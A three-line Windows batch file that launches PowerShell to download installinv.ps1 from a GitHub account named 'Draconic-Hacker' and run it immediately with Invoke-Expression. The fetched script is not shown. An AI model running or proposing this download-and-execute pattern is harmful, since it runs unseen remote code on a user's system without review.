@echo off
set "COMMIT=58473a8"

start powershell -noexit -command "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Draconic-Hacker/interface_ps1/%COMMIT%/installinv.ps1' -UseBasicParsing).Content"